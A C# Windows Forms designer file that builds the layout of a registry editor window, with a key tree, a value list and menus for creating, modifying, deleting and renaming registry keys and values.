using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using InvokedServer.Controls;
using InvokedServer.Utilities;

namespace InvokedServer.Forms
{
    partial class FrmRegistryEditor
    {
        private IContainer components;

        protected override void Dispose(bool disposing)
        {
            if (disposing && this.components != null)
                this.components.Dispose();
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = (IContainer)new System.ComponentModel.Container();
            ComponentResourceManager resources = new ComponentResourceManager(typeof(FrmRegistryEditor));
            ListViewColumnSorter viewColumnSorter = new ListViewColumnSorter();
            this.tableLayoutPanel = new TableLayoutPanel();
            this.splitContainer = new SplitContainer();
            this.tvRegistryDirectory = new RegistryTreeView();
            this.imageRegistryDirectoryList = new ImageList(this.components);
            this.lstRegistryValues = new AeroListView();
            this.hName = new ColumnHeader();
            this.hType = new ColumnHeader();
            this.hValue = new ColumnHeader();
            this.imageRegistryKeyTypeList = new ImageList(this.components);
            this.statusStrip = new StatusStrip();
            this.selectedStripStatusLabel = new ToolStripStatusLabel();
            this.menuStrip = new MenuStrip();
            this.fileToolStripMenuItem = new ToolStripMenuItem();
            this.exitToolStripMenuItem = new ToolStripMenuItem();
            this.editToolStripMenuItem = new ToolStripMenuItem();
            this.modifyToolStripMenuItem1 = new ToolStripMenuItem();
            this.modifyBinaryDataToolStripMenuItem1 = new ToolStripMenuItem();
            this.modifyNewtoolStripSeparator = new ToolStripSeparator();
            this.newToolStripMenuItem2 = new ToolStripMenuItem();
            this.keyToolStripMenuItem2 = new ToolStripMenuItem();
            this.toolStripSeparator7 = new ToolStripSeparator();
            this.stringValueToolStripMenuItem2 = new ToolStripMenuItem();
            this.binaryValueToolStripMenuItem2 = new ToolStripMenuItem();
            this.dWORD32bitValueToolStripMenuItem2 = new ToolStripMenuItem();
            this.qWORD64bitValueToolStripMenuItem2 = new ToolStripMenuItem();
            this.multiStringValueToolStripMenuItem2 = new ToolStripMenuItem();
            this.expandableStringValueToolStripMenuItem2 = new ToolStripMenuItem();
            this.toolStripSeparator6 = new ToolStripSeparator();
            this.deleteToolStripMenuItem2 = new ToolStripMenuItem();
            this.renameToolStripMenuItem2 = new ToolStripMenuItem();
            this.tv_ContextMenuStrip = new ContextMenuStrip(this.components);
            this.newToolStripMenuItem = new ToolStripMenuItem();
            this.keyToolStripMenuItem = new ToolStripMenuItem();
            this.toolStripSeparator2 = new ToolStripSeparator();
            this.stringValueToolStripMenuItem = new ToolStripMenuItem();
            this.binaryValueToolStripMenuItem = new ToolStripMenuItem();
            this.dWORD32bitValueToolStripMenuItem = new ToolStripMenuItem();
            this.qWORD64bitValueToolStripMenuItem = new ToolStripMenuItem();
            this.multiStringValueToolStripMenuItem = new ToolStripMenuItem();
            this.expandableStringValueToolStripMenuItem = new ToolStripMenuItem();
            this.toolStripSeparator1 = new ToolStripSeparator();
            this.deleteToolStripMenuItem = new ToolStripMenuItem();
            this.renameToolStripMenuItem = new ToolStripMenuItem();
            this.selectedItem_ContextMenuStrip = new ContextMenuStrip(this.components);
            this.modifyToolStripMenuItem = new ToolStripMenuItem();
            this.modifyBinaryDataToolStripMenuItem = new ToolStripMenuItem();
            this.modifyToolStripSeparator1 = new ToolStripSeparator();
            this.deleteToolStripMenuItem1 = new ToolStripMenuItem();
            this.renameToolStripMenuItem1 = new ToolStripMenuItem();
            this.lst_ContextMenuStrip = new ContextMenuStrip(this.components);
            this.newToolStripMenuItem1 = new ToolStripMenuItem();
            this.keyToolStripMenuItem1 = new ToolStripMenuItem();
            this.toolStripSeparator4 = new ToolStripSeparator();
            this.stringValueToolStripMenuItem1 = new ToolStripMenuItem();
            this.binaryValueToolStripMenuItem1 = new ToolStripMenuItem();
            this.dWORD32bitValueToolStripMenuItem1 = new ToolStripMenuItem();
            this.qWORD64bitValueToolStripMenuItem1 = new ToolStripMenuItem();
            this.multiStringValueToolStripMenuItem1 = new ToolStripMenuItem();
            this.expandableStringValueToolStripMenuItem1 = new ToolStripMenuItem();
            this.tableLayoutPanel.SuspendLayout();
            this.splitContainer.BeginInit();
            this.splitContainer.Panel1.SuspendLayout();
            this.splitContainer.Panel2.SuspendLayout();
            this.splitContainer.SuspendLayout();
            this.statusStrip.SuspendLayout();
            this.menuStrip.SuspendLayout();
            this.tv_ContextMenuStrip.SuspendLayout();
            this.selectedItem_ContextMenuStrip.SuspendLayout();
            this.lst_ContextMenuStrip.SuspendLayout();
            this.SuspendLayout();
            this.tableLayoutPanel.ColumnCount = 1;
            this.tableLayoutPanel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100f));
            this.tableLayoutPanel.Controls.Add((Control)this.splitContainer, 0, 1);
            this.tableLayoutPanel.Controls.Add((Control)this.statusStrip, 0, 2);
            this.tableLayoutPanel.Controls.Add((Control)this.menuStrip, 0, 0);
            this.tableLayoutPanel.Dock = DockStyle.Fill;
            this.tableLayoutPanel.GrowStyle = TableLayoutPanelGrowStyle.FixedSize;
            this.tableLayoutPanel.Location = new Point(0, 0);
            this.tableLayoutPanel.Name = "tableLayoutPanel";
            this.tableLayoutPanel.RowCount = 3;
            this.tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Absolute, 25f));
            this.tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 100f));
            this.tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Absolute, 22f));
            this.tableLayoutPanel.Size = new Size(784, 561);
            this.tableLayoutPanel.TabIndex = 0;
            this.splitContainer.Dock = DockStyle.Fill;
            this.splitContainer.Location = new Point(3, 28);
            this.splitContainer.Name = "splitContainer";
            this.splitContainer.Panel1.Controls.Add((Control)this.tvRegistryDirectory);
            this.splitContainer.Panel2.Controls.Add((Control)this.lstRegistryValues);
            this.splitContainer.Size = new Size(778, 508);
            this.splitContainer.SplitterDistance = 259;
            this.splitContainer.TabIndex = 0;
            this.tvRegistryDirectory.Dock = DockStyle.Fill;
            this.tvRegistryDirectory.HideSelection = false;
            this.tvRegistryDirectory.ImageIndex = 0;
            this.tvRegistryDirectory.ImageList = this.imageRegistryDirectoryList;
            this.tvRegistryDirectory.Location = new Point(0, 0);
            this.tvRegistryDirectory.Name = "tvRegistryDirectory";
            this.tvRegistryDirectory.SelectedImageIndex = 0;
            this.tvRegistryDirectory.Size = new Size(259, 508);
            this.tvRegistryDirectory.TabIndex = 0;
            this.tvRegistryDirectory.AfterLabelEdit += new NodeLabelEditEventHandler(this.tvRegistryDirectory_AfterLabelEdit);
            this.tvRegistryDirectory.BeforeExpand += new TreeViewCancelEventHandler(this.tvRegistryDirectory_BeforeExpand);
            this.tvRegistryDirectory.BeforeSelect += new TreeViewCancelEventHandler(this.tvRegistryDirectory_BeforeSelect);
            this.tvRegistryDirectory.NodeMouseClick += new TreeNodeMouseClickEventHandler(this.tvRegistryDirectory_NodeMouseClick);
            this.tvRegistryDirectory.KeyUp += new KeyEventHandler(this.tvRegistryDirectory_KeyUp);
            this.imageRegistryDirectoryList.ImageStream = (ImageListStreamer)resources.GetObject("imageRegistryDirectoryList.ImageStream");
            this.imageRegistryDirectoryList.TransparentColor = System.Drawing.Color.Transparent;
            this.imageRegistryDirectoryList.Images.SetKeyName(0, "folder.png");
            this.lstRegistryValues.Columns.AddRange(new ColumnHeader[3]
            {
        this.hName,
        this.hType,
        this.hValue
            });
            this.lstRegistryValues.Dock = DockStyle.Fill;
            this.lstRegistryValues.FullRowSelect = true;
            this.lstRegistryValues.HeaderStyle = ColumnHeaderStyle.Nonclickable;
            this.lstRegistryValues.HideSelection = false;
            this.lstRegistryValues.Location = new Point(0, 0);
            viewColumnSorter.NeedNumberCompare = false;
            viewColumnSorter.Order = SortOrder.None;
            viewColumnSorter.SortColumn = 0;
            this.lstRegistryValues.LvwColumnSorter = viewColumnSorter;
            this.lstRegistryValues.Name = "lstRegistryValues";
            this.lstRegistryValues.Size = new Size(515, 508);
            this.lstRegistryValues.SmallImageList = this.imageRegistryKeyTypeList;
            this.lstRegistryValues.TabIndex = 0;
            this.lstRegistryValues.UseCompatibleStateImageBehavior = false;
            this.lstRegistryValues.View = View.Details;
            this.lstRegistryValues.AfterLabelEdit += new LabelEditEventHandler(this.lstRegistryKeys_AfterLabelEdit);
            this.lstRegistryValues.KeyUp += new KeyEventHandler(this.lstRegistryKeys_KeyUp);
            this.lstRegistryValues.MouseUp += new MouseEventHandler(this.lstRegistryKeys_MouseClick);
            this.hName.Text = "Name";
            this.hName.Width = 173;
            this.hType.Text = "Type";
            this.hType.Width = 104;
            this.hValue.Text = "Value";
            this.hValue.Width = 214;
            this.imageRegistryKeyTypeList.ImageStream = (ImageListStreamer)resources.GetObject("imageRegistryKeyTypeList.ImageStream");
            this.imageRegistryKeyTypeList.TransparentColor = System.Drawing.Color.Transparent;
            this.imageRegistryKeyTypeList.Images.SetKeyName(0, "reg_string.png");
            this.imageRegistryKeyTypeList.Images.SetKeyName(1, "reg_binary.png");
            this.statusStrip.Dock = DockStyle.Fill;
            this.statusStrip.Items.AddRange(new ToolStripItem[1]
            {
        (ToolStripItem) this.selectedStripStatusLabel
            });
            this.statusStrip.Location = new Point(0, 539);
            this.statusStrip.Name = "statusStrip";
            this.statusStrip.Size = new Size(784, 22);
            this.statusStrip.TabIndex = 1;
            this.statusStrip.Text = "statusStrip";
            this.selectedStripStatusLabel.Name = "selectedStripStatusLabel";
            this.selectedStripStatusLabel.Size = new Size(0, 17);
            this.menuStrip.Dock = DockStyle.None;
            this.menuStrip.Font = new Font("Segoe UI", 9f);
            this.menuStrip.Items.AddRange(new ToolStripItem[2]
            {
        (ToolStripItem) this.fileToolStripMenuItem,
        (ToolStripItem) this.editToolStripMenuItem
            });
            this.menuStrip.Location = new Point(0, 0);
            this.menuStrip.Name = "menuStrip";
            this.menuStrip.Size = new Size(84, 24);
            this.menuStrip.TabIndex = 2;
            this.fileToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[1]
            {
        (ToolStripItem) this.exitToolStripMenuItem
            });
            this.fileToolStripMenuItem.Name = "fileToolStripMenuItem";
            this.fileToolStripMenuItem.Size = new Size(37, 20);
            this.fileToolStripMenuItem.Text = "File";
            this.exitToolStripMenuItem.Name = "exitToolStripMenuItem";
            this.exitToolStripMenuItem.Size = new Size(93, 22);
            this.exitToolStripMenuItem.Text = "Exit";
            this.exitToolStripMenuItem.Click += new EventHandler(this.menuStripExit_Click);
            this.editToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[7]
            {
        (ToolStripItem) this.modifyToolStripMenuItem1,
        (ToolStripItem) this.modifyBinaryDataToolStripMenuItem1,
        (ToolStripItem) this.modifyNewtoolStripSeparator,
        (ToolStripItem) this.newToolStripMenuItem2,
        (ToolStripItem) this.toolStripSeparator6,
        (ToolStripItem) this.deleteToolStripMenuItem2,
        (ToolStripItem) this.renameToolStripMenuItem2
            });
            this.editToolStripMenuItem.Name = "editToolStripMenuItem";
            this.editToolStripMenuItem.Size = new Size(39, 20);
            this.editToolStripMenuItem.Text = "Edit";
            this.editToolStripMenuItem.DropDownOpening += new EventHandler(this.editToolStripMenuItem_DropDownOpening);
            this.modifyToolStripMenuItem1.Enabled = false;
            this.modifyToolStripMenuItem1.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, (byte)0);
            this.modifyToolStripMenuItem1.Name = "modifyToolStripMenuItem1";
            this.modifyToolStripMenuItem1.Size = new Size(184, 22);
            this.modifyToolStripMenuItem1.Text = "Modify...";
            this.modifyToolStripMenuItem1.Visible = false;
            this.modifyToolStripMenuItem1.Click += new EventHandler(this.modifyRegistryValue_Click);
            this.modifyBinaryDataToolStripMenuItem1.Enabled = false;
            this.modifyBinaryDataToolStripMenuItem1.Name = "modifyBinaryDataToolStripMenuItem1";
            this.modifyBinaryDataToolStripMenuItem1.Size = new Size(184, 22);
            this.modifyBinaryDataToolStripMenuItem1.Text = "Modify Binary Data...";
            this.modifyBinaryDataToolStripMenuItem1.Visible = false;
            this.modifyBinaryDataToolStripMenuItem1.Click += new EventHandler(this.modifyBinaryDataRegistryValue_Click);
            this.modifyNewtoolStripSeparator.Name = "modifyNewtoolStripSeparator";
            this.modifyNewtoolStripSeparator.Size = new Size(181, 6);
            this.modifyNewtoolStripSeparator.Visible = false;
            this.newToolStripMenuItem2.DropDownItems.AddRange(new ToolStripItem[8]
            {
        (ToolStripItem) this.keyToolStripMenuItem2,
        (ToolStripItem) this.toolStripSeparator7,
        (ToolStripItem) this.stringValueToolStripMenuItem2,
        (ToolStripItem) this.binaryValueToolStripMenuItem2,
        (ToolStripItem) this.dWORD32bitValueToolStripMenuItem2,
        (ToolStripItem) this.qWORD64bitValueToolStripMenuItem2,
        (ToolStripItem) this.multiStringValueToolStripMenuItem2,
        (ToolStripItem) this.expandableStringValueToolStripMenuItem2
            });
            this.newToolStripMenuItem2.Name = "newToolStripMenuItem2";
            this.newToolStripMenuItem2.Size = new Size(184, 22);
            this.newToolStripMenuItem2.Text = "New";
            this.keyToolStripMenuItem2.Name = "keyToolStripMenuItem2";
            this.keyToolStripMenuItem2.Size = new Size(200, 22);
            this.keyToolStripMenuItem2.Text = "Key";
            this.keyToolStripMenuItem2.Click += new EventHandler(this.createNewRegistryKey_Click);
            this.toolStripSeparator7.Name = "toolStripSeparator7";
            this.toolStripSeparator7.Size = new Size(197, 6);
            this.stringValueToolStripMenuItem2.Name = "stringValueToolStripMenuItem2";
            this.stringValueToolStripMenuItem2.Size = new Size(200, 22);
            this.stringValueToolStripMenuItem2.Text = "String Value";
            this.stringValueToolStripMenuItem2.Click += new EventHandler(this.createStringRegistryValue_Click);
            this.binaryValueToolStripMenuItem2.Name = "binaryValueToolStripMenuItem2";
            this.binaryValueToolStripMenuItem2.Size = new Size(200, 22);
            this.binaryValueToolStripMenuItem2.Text = "Binary Value";
            this.binaryValueToolStripMenuItem2.Click += new EventHandler(this.createBinaryRegistryValue_Click);
            this.dWORD32bitValueToolStripMenuItem2.Name = "dWORD32bitValueToolStripMenuItem2";
            this.dWORD32bitValueToolStripMenuItem2.Size = new Size(200, 22);
            this.dWORD32bitValueToolStripMenuItem2.Text = "DWORD (32-bit) Value";
            this.dWORD32bitValueToolStripMenuItem2.Click += new EventHandler(this.createDwordRegistryValue_Click);
            this.qWORD64bitValueToolStripMenuItem2.Name = "qWORD64bitValueToolStripMenuItem2";
            this.qWORD64bitValueToolStripMenuItem2.Size = new Size(200, 22);
            this.qWORD64bitValueToolStripMenuItem2.Text = "QWORD (64-bit) Value";
            this.qWORD64bitValueToolStripMenuItem2.Click += new EventHandler(this.createQwordRegistryValue_Click);
            this.multiStringValueToolStripMenuItem2.Name = "multiStringValueToolStripMenuItem2";
            this.multiStringValueToolStripMenuItem2.Size = new Size(200, 22);
            this.multiStringValueToolStripMenuItem2.Text = "Multi-String Value";
            this.multiStringValueToolStripMenuItem2.Click += new EventHandler(this.createMultiStringRegistryValue_Click);
            this.expandableStringValueToolStripMenuItem2.Name = "expandableStringValueToolStripMenuItem2";
            this.expandableStringValueToolStripMenuItem2.Size = new Size(200, 22);
            this.expandableStringValueToolStripMenuItem2.Text = "Expandable String Value";
            this.expandableStringValueToolStripMenuItem2.Click += new EventHandler(this.createExpandStringRegistryValue_Click);
            this.toolStripSeparator6.Name = "toolStripSeparator6";
            this.toolStripSeparator6.Size = new Size(181, 6);
            this.deleteToolStripMenuItem2.Enabled = false;
            this.deleteToolStripMenuItem2.Name = "deleteToolStripMenuItem2";
            this.deleteToolStripMenuItem2.ShortcutKeyDisplayString = "Del";
            this.deleteToolStripMenuItem2.Size = new Size(184, 22);
            this.deleteToolStripMenuItem2.Text = "Delete";
            this.deleteToolStripMenuItem2.Click += new EventHandler(this.menuStripDelete_Click);
            this.renameToolStripMenuItem2.Enabled = false;
            this.renameToolStripMenuItem2.Name = "renameToolStripMenuItem2";
            this.renameToolStripMenuItem2.Size = new Size(184, 22);
            this.renameToolStripMenuItem2.Text = "Rename";
            this.renameToolStripMenuItem2.Click += new EventHandler(this.menuStripRename_Click);
            this.tv_ContextMenuStrip.Items.AddRange(new ToolStripItem[4]
            {
        (ToolStripItem) this.newToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator1,
        (ToolStripItem) this.deleteToolStripMenuItem,
        (ToolStripItem) this.renameToolStripMenuItem
            });
            this.tv_ContextMenuStrip.Name = "contextMenuStrip";
            this.tv_ContextMenuStrip.Size = new Size(118, 76);
            this.newToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[8]
            {
        (ToolStripItem) this.keyToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator2,
        (ToolStripItem) this.stringValueToolStripMenuItem,
        (ToolStripItem) this.binaryValueToolStripMenuItem,
        (ToolStripItem) this.dWORD32bitValueToolStripMenuItem,
        (ToolStripItem) this.qWORD64bitValueToolStripMenuItem,
        (ToolStripItem) this.multiStringValueToolStripMenuItem,
        (ToolStripItem) this.expandableStringValueToolStripMenuItem
            });
            this.newToolStripMenuItem.Name = "newToolStripMenuItem";
            this.newToolStripMenuItem.Size = new Size(117, 22);
            this.newToolStripMenuItem.Text = "New";
            this.keyToolStripMenuItem.Name = "keyToolStripMenuItem";
            this.keyToolStripMenuItem.Size = new Size(200, 22);
            this.keyToolStripMenuItem.Text = "Key";
            this.keyToolStripMenuItem.Click += new EventHandler(this.createNewRegistryKey_Click);
            this.toolStripSeparator2.Name = "toolStripSeparator2";
            this.toolStripSeparator2.Size = new Size(197, 6);
            this.stringValueToolStripMenuItem.Name = "stringValueToolStripMenuItem";
            this.stringValueToolStripMenuItem.Size = new Size(200, 22);
            this.stringValueToolStripMenuItem.Text = "String Value";
            this.stringValueToolStripMenuItem.Click += new EventHandler(this.createStringRegistryValue_Click);
            this.binaryValueToolStripMenuItem.Name = "binaryValueToolStripMenuItem";
            this.binaryValueToolStripMenuItem.Size = new Size(200, 22);
            this.binaryValueToolStripMenuItem.Text = "Binary Value";
            this.binaryValueToolStripMenuItem.Click += new EventHandler(this.createBinaryRegistryValue_Click);
            this.dWORD32bitValueToolStripMenuItem.Name = "dWORD32bitValueToolStripMenuItem";
            this.dWORD32bitValueToolStripMenuItem.Size = new Size(200, 22);
            this.dWORD32bitValueToolStripMenuItem.Text = "DWORD (32-bit) Value";
            this.dWORD32bitValueToolStripMenuItem.Click += new EventHandler(this.createDwordRegistryValue_Click);
            this.qWORD64bitValueToolStripMenuItem.Name = "qWORD64bitValueToolStripMenuItem";
            this.qWORD64bitValueToolStripMenuItem.Size = new Size(200, 22);
            this.qWORD64bitValueToolStripMenuItem.Text = "QWORD (64-bit) Value";
            this.qWORD64bitValueToolStripMenuItem.Click += new EventHandler(this.createQwordRegistryValue_Click);
            this.multiStringValueToolStripMenuItem.Name = "multiStringValueToolStripMenuItem";
            this.multiStringValueToolStripMenuItem.Size = new Size(200, 22);
            this.multiStringValueToolStripMenuItem.Text = "Multi-String Value";
            this.multiStringValueToolStripMenuItem.Click += new EventHandler(this.createMultiStringRegistryValue_Click);
            this.expandableStringValueToolStripMenuItem.Name = "expandableStringValueToolStripMenuItem";
            this.expandableStringValueToolStripMenuItem.Size = new Size(200, 22);
            this.expandableStringValueToolStripMenuItem.Text = "Expandable String Value";
            this.expandableStringValueToolStripMenuItem.Click += new EventHandler(this.createExpandStringRegistryValue_Click);
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new Size(114, 6);
            this.deleteToolStripMenuItem.Enabled = false;
            this.deleteToolStripMenuItem.Name = "deleteToolStripMenuItem";
            this.deleteToolStripMenuItem.Size = new Size(117, 22);
            this.deleteToolStripMenuItem.Text = "Delete";
            this.deleteToolStripMenuItem.Click += new EventHandler(this.deleteRegistryKey_Click);
            this.renameToolStripMenuItem.Enabled = false;
            this.renameToolStripMenuItem.Name = "renameToolStripMenuItem";
            this.renameToolStripMenuItem.Size = new Size(117, 22);
            this.renameToolStripMenuItem.Text = "Rename";
            this.renameToolStripMenuItem.Click += new EventHandler(this.renameRegistryKey_Click);
            this.selectedItem_ContextMenuStrip.Items.AddRange(new ToolStripItem[5]
            {
        (ToolStripItem) this.modifyToolStripMenuItem,
        (ToolStripItem) this.modifyBinaryDataToolStripMenuItem,
        (ToolStripItem) this.modifyToolStripSeparator1,
        (ToolStripItem) this.deleteToolStripMenuItem1,
        (ToolStripItem) this.renameToolStripMenuItem1
            });
            this.selectedItem_ContextMenuStrip.Name = "selectedItem_ContextMenuStrip";
            this.selectedItem_ContextMenuStrip.Size = new Size(185, 98);
            this.modifyToolStripMenuItem.Enabled = false;
            this.modifyToolStripMenuItem.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, (byte)0);
            this.modifyToolStripMenuItem.Name = "modifyToolStripMenuItem";
            this.modifyToolStripMenuItem.Size = new Size(184, 22);
            this.modifyToolStripMenuItem.Text = "Modify...";
            this.modifyToolStripMenuItem.Click += new EventHandler(this.modifyRegistryValue_Click);
            this.modifyBinaryDataToolStripMenuItem.Enabled = false;
            this.modifyBinaryDataToolStripMenuItem.Name = "modifyBinaryDataToolStripMenuItem";
            this.modifyBinaryDataToolStripMenuItem.Size = new Size(184, 22);
            this.modifyBinaryDataToolStripMenuItem.Text = "Modify Binary Data...";
            this.modifyBinaryDataToolStripMenuItem.Click += new EventHandler(this.modifyBinaryDataRegistryValue_Click);
            this.modifyToolStripSeparator1.Name = "modifyToolStripSeparator1";
            this.modifyToolStripSeparator1.Size = new Size(181, 6);
            this.deleteToolStripMenuItem1.Name = "deleteToolStripMenuItem1";
            this.deleteToolStripMenuItem1.Size = new Size(184, 22);
            this.deleteToolStripMenuItem1.Text = "Delete";
            this.deleteToolStripMenuItem1.Click += new EventHandler(this.deleteRegistryValue_Click);
            this.renameToolStripMenuItem1.Name = "renameToolStripMenuItem1";
            this.renameToolStripMenuItem1.Size = new Size(184, 22);
            this.renameToolStripMenuItem1.Text = "Rename";
            this.renameToolStripMenuItem1.Click += new EventHandler(this.renameRegistryValue_Click);
            this.lst_ContextMenuStrip.Items.AddRange(new ToolStripItem[1]
            {
        (ToolStripItem) this.newToolStripMenuItem1
            });
            this.lst_ContextMenuStrip.Name = "lst_ContextMenuStrip";
            this.lst_ContextMenuStrip.Size = new Size(99, 26);
            this.newToolStripMenuItem1.DropDownItems.AddRange(new ToolStripItem[8]
            {
        (ToolStripItem) this.keyToolStripMenuItem1,
        (ToolStripItem) this.toolStripSeparator4,
        (ToolStripItem) this.stringValueToolStripMenuItem1,
        (ToolStripItem) this.binaryValueToolStripMenuItem1,
        (ToolStripItem) this.dWORD32bitValueToolStripMenuItem1,
        (ToolStripItem) this.qWORD64bitValueToolStripMenuItem1,
        (ToolStripItem) this.multiStringValueToolStripMenuItem1,
        (ToolStripItem) this.expandableStringValueToolStripMenuItem1
            });
            this.newToolStripMenuItem1.Name = "newToolStripMenuItem1";
            this.newToolStripMenuItem1.Size = new Size(98, 22);
            this.newToolStripMenuItem1.Text = "New";
            this.keyToolStripMenuItem1.Name = "keyToolStripMenuItem1";
            this.keyToolStripMenuItem1.Size = new Size(200, 22);
            this.keyToolStripMenuItem1.Text = "Key";
            this.keyToolStripMenuItem1.Click += new EventHandler(this.createNewRegistryKey_Click);
            this.toolStripSeparator4.Name = "toolStripSeparator4";
            this.toolStripSeparator4.Size = new Size(197, 6);
            this.stringValueToolStripMenuItem1.Name = "stringValueToolStripMenuItem1";
            this.stringValueToolStripMenuItem1.Size = new Size(200, 22);
            this.stringValueToolStripMenuItem1.Text = "String Value";
            this.stringValueToolStripMenuItem1.Click += new EventHandler(this.createStringRegistryValue_Click);
            this.binaryValueToolStripMenuItem1.Name = "binaryValueToolStripMenuItem1";
            this.binaryValueToolStripMenuItem1.Size = new Size(200, 22);
            this.binaryValueToolStripMenuItem1.Text = "Binary Value";
            this.binaryValueToolStripMenuItem1.Click += new EventHandler(this.createBinaryRegistryValue_Click);
            this.dWORD32bitValueToolStripMenuItem1.Name = "dWORD32bitValueToolStripMenuItem1";
            this.dWORD32bitValueToolStripMenuItem1.Size = new Size(200, 22);
            this.dWORD32bitValueToolStripMenuItem1.Text = "DWORD (32-bit) Value";
            this.dWORD32bitValueToolStripMenuItem1.Click += new EventHandler(this.createDwordRegistryValue_Click);
            this.qWORD64bitValueToolStripMenuItem1.Name = "qWORD64bitValueToolStripMenuItem1";
            this.qWORD64bitValueToolStripMenuItem1.Size = new Size(200, 22);
            this.qWORD64bitValueToolStripMenuItem1.Text = "QWORD (64-bit) Value";
            this.qWORD64bitValueToolStripMenuItem1.Click += new EventHandler(this.createQwordRegistryValue_Click);
            this.multiStringValueToolStripMenuItem1.Name = "multiStringValueToolStripMenuItem1";
            this.multiStringValueToolStripMenuItem1.Size = new Size(200, 22);
            this.multiStringValueToolStripMenuItem1.Text = "Multi-String Value";
            this.multiStringValueToolStripMenuItem1.Click += new EventHandler(this.createMultiStringRegistryValue_Click);
            this.expandableStringValueToolStripMenuItem1.Name = "expandableStringValueToolStripMenuItem1";
            this.expandableStringValueToolStripMenuItem1.Size = new Size(200, 22);
            this.expandableStringValueToolStripMenuItem1.Text = "Expandable String Value";
            this.expandableStringValueToolStripMenuItem1.Click += new EventHandler(this.createExpandStringRegistryValue_Click);
            this.AutoScaleDimensions = new SizeF(96f, 96f);
            this.AutoScaleMode = AutoScaleMode.Dpi;
            this.ClientSize = new Size(784, 561);
            this.Controls.Add((Control)this.tableLayoutPanel);
            this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte)0);
            this.ForeColor = System.Drawing.Color.Black;
            this.Icon = (Icon)resources.GetObject("$this.Icon");
            this.MainMenuStrip = this.menuStrip;
            this.Name = "FrmRegistryEditor";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "Registry Editor []";
            this.FormClosing += new FormClosingEventHandler(this.FrmRegistryEditor_FormClosing);
            this.Load += new EventHandler(this.FrmRegistryEditor_Load);
            this.tableLayoutPanel.ResumeLayout(false);
            this.tableLayoutPanel.PerformLayout();
            this.splitContainer.Panel1.ResumeLayout(false);
            this.splitContainer.Panel2.ResumeLayout(false);
            this.splitContainer.EndInit();
            this.splitContainer.ResumeLayout(false);
            this.statusStrip.ResumeLayout(false);
            this.statusStrip.PerformLayout();
            this.menuStrip.ResumeLayout(false);
            this.menuStrip.PerformLayout();
            this.tv_ContextMenuStrip.ResumeLayout(false);
            this.selectedItem_ContextMenuStrip.ResumeLayout(false);
            this.lst_ContextMenuStrip.ResumeLayout(false);
            this.ResumeLayout(false);
        }

        private TableLayoutPanel tableLayoutPanel;
        private SplitContainer splitContainer;
        private RegistryTreeView tvRegistryDirectory;
        private AeroListView lstRegistryValues;
        private StatusStrip statusStrip;
        private ToolStripStatusLabel selectedStripStatusLabel;
        private ImageList imageRegistryDirectoryList;
        private ColumnHeader hName;
        private ColumnHeader hType;
        private ColumnHeader hValue;
        private ImageList imageRegistryKeyTypeList;
        private ContextMenuStrip tv_ContextMenuStrip;
        private ToolStripMenuItem newToolStripMenuItem;
        private ToolStripMenuItem keyToolStripMenuItem;
        private ToolStripSeparator toolStripSeparator1;
        private ToolStripMenuItem deleteToolStripMenuItem;
        private ToolStripMenuItem renameToolStripMenuItem;
        private ToolStripSeparator toolStripSeparator2;
        private ToolStripMenuItem stringValueToolStripMenuItem;
        private ToolStripMenuItem binaryValueToolStripMenuItem;
        private ToolStripMenuItem dWORD32bitValueToolStripMenuItem;
        private ToolStripMenuItem qWORD64bitValueToolStripMenuItem;
        private ToolStripMenuItem multiStringValueToolStripMenuItem;
        private ToolStripMenuItem expandableStringValueToolStripMenuItem;
        private ContextMenuStrip selectedItem_ContextMenuStrip;
        private ToolStripMenuItem modifyToolStripMenuItem;
        private ToolStripMenuItem modifyBinaryDataToolStripMenuItem;
        private ToolStripMenuItem deleteToolStripMenuItem1;
        private ToolStripMenuItem renameToolStripMenuItem1;
        private ContextMenuStrip lst_ContextMenuStrip;
        private ToolStripMenuItem newToolStripMenuItem1;
        private ToolStripMenuItem keyToolStripMenuItem1;
        private ToolStripMenuItem stringValueToolStripMenuItem1;
        private ToolStripMenuItem binaryValueToolStripMenuItem1;
        private ToolStripMenuItem dWORD32bitValueToolStripMenuItem1;
        private ToolStripMenuItem qWORD64bitValueToolStripMenuItem1;
        private ToolStripMenuItem multiStringValueToolStripMenuItem1;
        private ToolStripMenuItem expandableStringValueToolStripMenuItem1;
        private ToolStripSeparator toolStripSeparator4;
        private MenuStrip menuStrip;
        private ToolStripMenuItem fileToolStripMenuItem;
        private ToolStripMenuItem exitToolStripMenuItem;
        private ToolStripMenuItem editToolStripMenuItem;
        private ToolStripMenuItem modifyToolStripMenuItem1;
        private ToolStripMenuItem modifyBinaryDataToolStripMenuItem1;
        private ToolStripSeparator modifyNewtoolStripSeparator;
        private ToolStripMenuItem newToolStripMenuItem2;
        private ToolStripSeparator toolStripSeparator6;
        private ToolStripMenuItem deleteToolStripMenuItem2;
        private ToolStripMenuItem renameToolStripMenuItem2;
        private ToolStripMenuItem keyToolStripMenuItem2;
        private ToolStripSeparator toolStripSeparator7;
        private ToolStripMenuItem stringValueToolStripMenuItem2;
        private ToolStripMenuItem binaryValueToolStripMenuItem2;
        private ToolStripMenuItem dWORD32bitValueToolStripMenuItem2;
        private ToolStripMenuItem qWORD64bitValueToolStripMenuItem2;
        private ToolStripMenuItem multiStringValueToolStripMenuItem2;
        private ToolStripMenuItem expandableStringValueToolStripMenuItem2;
        private ToolStripSeparator modifyToolStripSeparator1;
    }
}
